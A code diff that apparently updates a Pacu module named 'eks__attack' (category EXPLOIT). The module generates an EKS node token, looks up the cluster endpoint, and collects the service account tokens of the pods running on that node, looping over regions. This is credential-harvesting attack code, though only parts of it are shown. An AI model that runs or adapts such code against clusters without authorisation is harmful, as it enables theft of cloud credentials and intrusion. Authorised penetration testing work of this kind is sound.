@@ -3,19 +3,21 @@ import argparse
 import json
 import requests
 from botocore.exceptions import ClientError
-from botocore import session as botocore_session
 # Used to generate eks authentication token
 from awscli.customizations.eks.get_token import STSClientFactory, TokenGenerator
 
 
-# TODO look for cluster stored in database
+# TODO 
+# look for cluster stored in database
+# store data in database
+# error handling
 
 
 # When writing a module, feel free to remove any comments, placeholders, or
 # anything else that doesn't relate to your module.
 
 module_info = {
-    'name': 'eks__exploit_extract_token',
+    'name': 'eks__attack',
     'author': 'Roshan Guragain',
     'category': 'EXPLOIT',
     'one_liner': 'This modules gets all the service account tokens of pods running on a node in EKS.',
@@ -129,8 +131,11 @@ class Communicator:
             Get service account token of pods in the node
         '''
         for pod in self.pods:
-            self.get_sa_token(pod)
-
+            try:
+                self.get_sa_token(pod)
+            except Exception as e:
+                print(f"Pod {pod.name} not in current node. Error: {str(e)}")
+                
 
 # Main is the first function that is called when this module is executed.
 def main(args, pacu_main):
@@ -154,22 +159,28 @@ def main(args, pacu_main):
     else:
         regions = args.regions.split(',')
 
-    boto_session = botocore_session.get_session()
+    for region in regions:
+        try:
+            # error handling missing
+            boto_session = pacu_main.get_boto_session()._session
 
-    region = 'us-east-1'
-    eks_token = get_eks_node_token(boto_session, cluster_name)
+            eks_token = get_eks_node_token(boto_session, cluster_name, region=region)
+            # get information about current cluster
+            eks_client = pacu_main.get_boto3_client('eks', region)
+            cluster_information = eks_client.describe_cluster(name=cluster_name)
 
-    # get information about current cluster , # todo use the already found clusters 
-    eks_client = pacu_main.get_boto3_client('eks', region)
-    cluster_information = eks_client.describe_cluster(name=cluster_name)
+            # get cluster-endpoint to use later
+            cluster_endpoint = cluster_information['cluster']['endpoint']
+            print(cluster_endpoint)
 
-    # get cluster-endpoint to use later
-    cluster_endpoint = cluster_information['cluster']['endpoint']
+            a = Communicator(cluster_endpoint, eks_token)
+            a.get_all_tokens()
 
-    a = Communicator(cluster_endpoint, eks_token)
-    a.get_all_tokens()
-
-    return {"Eks-Token": eks_token}
+            data = {"Eks-Token": eks_token, "endpoint": cluster_endpoint}
+            return data
+        
+        except ClientError as error:
+            print(f"Error: {error}")
 
 
 def get_eks_node_token(session, cluster_name, region=None):
@@ -190,9 +201,8 @@ def get_eks_node_token(session, cluster_name, region=None):
 # contain whatever data is needed in any structure desired. A length limit ofa
 # 1000 characters is enforced on strings returned by module summary functions.
 def summary(data, pacu_main):
-    # need proper output
     if 'Eks-Token' in data.keys():
-        return 'EKS token for a node found'
+        return f"EKS node token found.Eks Endpoint {data['endpoint']}"
     else:
-        return 'EKS token not found'
+        return "EKS node token not found"
 
